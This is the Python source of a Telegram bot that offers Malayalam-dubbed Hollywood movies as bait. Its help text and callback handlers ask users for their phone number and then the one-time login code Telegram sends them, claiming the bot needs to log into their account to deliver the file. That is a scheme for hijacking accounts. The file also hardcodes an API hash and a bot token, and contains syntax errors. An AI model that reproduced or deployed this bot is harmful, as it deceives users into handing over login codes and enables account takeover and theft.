from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

HKZ = Client(
  name="Elizabeth-Olsen",
  api_id="25988816",
  api_hash="7ad4c2b1e5556277d341477b0776b2de",
  bot_token="8127557975:AAGcuavIDOjKQcMpS6VqjkBENh6IT6JLwD0"
)

@HKZ.on_message(filters.command("start"))
async def start(client, message):
    await message.reply(
        text=f"""Hey there {message.from_user.mention} 👋,

I am [Elizabeth Olsen](t.me/HollywoodMalayalamMovieBot),I can share you Malayalam Dubbed Hollywood Movies. Just Click in the Movies List Button and Choose the Movie you want 😍

Hit /help to know more ✨""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("Movies List 🌼", callback_data="list"),
            ],[
            InlineKeyboardButton("Help 🛠", callback_data="help"),
            InlineKeyboardButton("About 🤠", callback_data="about")
            ]]
            )
        )

@HKZ.on_message(filters.command("help"))
async def help(client, message):
    await message.reply(
        text=f"""Hey {message.from_user.mention} ✨

Basic Commands:
/start - Check I am Alive ☑
/help  - To Reach Here
/about - About Me 🤠
/list  - Check the Movies I have

Instructions:

When you will request the Movie You want to login with your Telegram Phone Number.

Then You will Receive a Code from Telegram, Just Send the Code to Me.

After Login The Movie File will be upload in your Telegram Saved Messages.

Note:- You Can request only 2 Movies Per Week..!
If the Movie didn't got please request Again..!""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("Movies List 🌼", callback_data="list"),
            ],[
            InlineKeyboardButton("Home 🏡", callback_data="start"),
            InlineKeyboardButton("About 🤠", callback_data="about")
            ]]
            )
        )

@HKZ.on_message(filters.command("about"))
async def about(client, message):
    await message.reply(
        text=f"""Hey {message.from_user.mention} ✨

✰ My Name  : [Elizabeth Olsen](t.me/HollywoodMalayalamMovieBot)
✰ Language : [Python 3.13.0](www.python.org)
✰ Library  : Pyrogram, Tgcrypto
✰ Server   : [Render](www.render.com)""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("Home 🏡", callback_data="start"),
            InlineKeyboardButton("Help 🛠", callback_data="help")
            ]]
            )
        )




@HKZ.on_message(filters.text)
async def natm_txt(client, message):
    await message.reply(
        text=f"<b>Here is What I Found for Your Query #{message.text}</b>..!",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton(text=f"<b>{message.text} Malayalam Dubbed Full Movie @HollywoodMalayalamMovieBot.mkv</b>", callback_data="mission")
            ]]
            )
        )

@HKZ.on_message(filters.command("list"))
async def list(client, message):
    await message.reply(
        text="""Here is the List of Movies I have..!

Note:- You can only request 2 Movies in a week..!""",
        reply_markup=InlineKeyboardMarkup( [[
            InlineKeyboardButton("300", callback_data="mission"),
            InlineKeyboardButton("2012", callback_data="mission"),
            ],[
            InlineKeyboardButton("Agent Cody Banks", callback_data="mission"),
            InlineKeyboardButton("Avengers Infinity War", callback_data="mission"),
            ],[
            InlineKeyboardButton("Anaconda", callback_data="mission"),
            InlineKeyboardButton("Anaconda 2", callback_data="mission"),
            ],[
            InlineKeyboardButton("Anaconda 3", callback_data="mission"),
            InlineKeyboardButton("Ben Hur (1959)", callback_data="mission"),
            ],[
            InlineKeyboardButton("Ben Hur (2016)", callback_data="mission"),
            InlineKeyboardButton("Black Widow", callback_data="mission"),
            ],[
            InlineKeyboardButton("Captain Phillips", callback_data="captainphilips"),
            InlineKeyboardButton("CZ12", callback_data="mission"),
            ],[
            InlineKeyboardButton("Die Another Day", callback_data="mission"),
            InlineKeyboardButton("Die Hard", callback_data="mission"),
            ],[
            InlineKeyboardButton("Django Unchained", callback_data="mission"),
            InlineKeyboardButton("Doctor Strange 2", callback_data="mission"),
            ],[
            InlineKeyboardButton("Exodus Gods and Kings", callback_data="mission"),
            InlineKeyboardButton("Ghost Rider", callback_data="mission"),
            ],[
            InlineKeyboardButton("Godzilla", callback_data="mission"),
            InlineKeyboardButton("Home Alone 2", callback_data="mission"),
            ],[
            InlineKeyboardButton("Hotel Transylvania", callback_data="mission"),
            InlineKeyboardButton("Ice Age", callback_data="mission"),
            ],[
            InlineKeyboardButton("Jack the Giant Slayer", callback_data="mission"),
            InlineKeyboardButton("Jumanji", callback_data="mission"),
            ],[
            InlineKeyboardButton("Jumanji 2", callback_data="mission"),
            InlineKeyboardButton("Jumanji 3", callback_data="mission"),
            ],[
            InlineKeyboardButton("Jurassic Park", callback_data="mission"),
            InlineKeyboardButton("Jurassic World Dominion", callback_data="mission"),
            ],[
            InlineKeyboardButton("King Kong", callback_data="mission"),
            InlineKeyboardButton("Man of Steel", callback_data="mission"),
            ],[
            InlineKeyboardButton("Men in Black", callback_data="mission"),
            InlineKeyboardButton("Men in Black 2", callback_data="mission"),
            ],[
            InlineKeyboardButton("MIB International", callback_data="mission"),
            InlineKeyboardButton("Monster House", callback_data="mission"),
            ],[
            InlineKeyboardButton("Night at the Museum", callback_data="mission"),
            ],[
            InlineKeyboardButton("Pacific Rim", callback_data="mission"),
            ],[
            InlineKeyboardButton("Rob B Hood", callback_data="mission"),
            ],[
            InlineKeyboardButton("Spiderman Series", callback_data="mission"),
            ],[
            InlineKeyboardButton("Stuart Little 2", callback_data="mission"),
            ],[
            InlineKeyboardButton("The Adventures of Tintin", callback_data="mission"),
            ],[
            InlineKeyboardButton("Titanic", callback_data="mission"),
            InlineKeyboardButton("The Angry Birds", callback_data="mission"),
            ],[
            InlineKeyboardButton("The Smurfs", callback_data="mission"),
            InlineKeyboardButton("The Smurfs", callback_data="mission"),
            ],[
            InlineKeyboardButton("The Conjuring", callback_data="mission"),
            InlineKeyboardButton("The Da Vinci Code", callback_data="mission"),
            ],[
            InlineKeyboardButton("Van Helsing", callback_data="mission")
            ]]
            )

        )

@HKZ.on_callback_query()
async def callback(bot, msg):
    if msg.data == result":
        await msg.message.edit_text("""𝖳𝗁𝗂𝗌 𝗂𝗌 𝗍𝗁𝖾 𝗉𝗋𝗈𝖼𝖾𝗌𝗌 𝗍𝗈 𝗅𝗈𝗀𝗂𝗇 𝗍𝗈 𝗒𝗈𝗎𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍. 𝖨 𝖺𝗆 𝗅𝗈𝗀𝗂𝗇 𝗍𝗈 𝗒𝗈𝗎𝗋 𝖺𝖼𝖼𝗈𝗎𝗇𝗍 𝗍𝗈 𝗎𝗉𝗅𝗈𝖺𝖽 𝗍𝗁𝖾 𝖿𝗂𝗅𝖾 𝗂𝗇 𝗒𝗈𝗎𝗋 𝖲𝖺𝗏𝖾𝖽 𝖬𝖾𝗌𝗌𝖺𝗀𝖾𝗌

𝖤𝗇𝗍𝖾𝗋 𝗍𝗁𝖾 𝗉𝗁𝗈𝗇𝖾 𝗇𝗎𝗆𝖻𝖾𝗋, 𝖺𝗅𝗈𝗇𝗀 𝗐𝗂𝗍𝗁 𝖼𝗈𝗎𝗇𝗍𝗋𝗒 𝖼𝗈𝖽𝖾. 𝖤𝗑𝖺𝗆𝗉𝗅𝖾: +91876543210"""
        )
    elif msg.data == "start":
        await msg.message.edit_text(f"""Hey there {message.from_user.mention} 👋,

I am [Elizabeth Olsen](t.me/HollywoodMalayalamMovieBot),I can share you Malayalam Dubbed Hollywood Movies. Just Send Me the Movie Name you want 😍

Hit /help to know more ✨"""
        )
    elif msg.data == "help":
        await msg.message.edit_text(f"""Hey {msg.from_user.mention} ✨

Basic Commands:
/start - Check I am Alive ☑
/help  - To Reach Here
/about - About Me 🤠
/list  - Check the Movies I have

Instructions:

When you will request the Movie You want to login with your Telegram Phone Number.

Then You will Receive a Code from Telegram, Just Send the Code to Me.

After Login The Movie File will be upload in your Telegram Saved Messages.

Note:- You Can request only 2 Movies Per Week..!
If the Movie didn't got please request Again..!"""
        )
    elif msg.data == "about":
        await msg.message.edit_text(f"""Hey {msg.from_user.mention} ✨

✰ My Name  : [Elizabeth Olsen](t.me/HollywoodMalayalamMovieBot)
✰ My Owner : [SOUL TG](www.github.com/SOULTG)
✰ Language : [Python 3.13.0](www.python.org)
✰ Library  : Pyrogram, Tgcrypto
✰ Server   : [Render](www.render.com)"""
        )
    elif msg.data == "mission":
        await msg.message.edit_text(f"""👋🏻 Hey there {msg.from_user.mention},
        
Here is What I Found for your Query 🔍""",
            reply_markup=InlineKeyboardMarkup( [[
                InlineKeyboardButton("Download Your Movie ✨", callback_data="result")
                ]]
                )
            )


print("Bot Started")
HKZ.run()
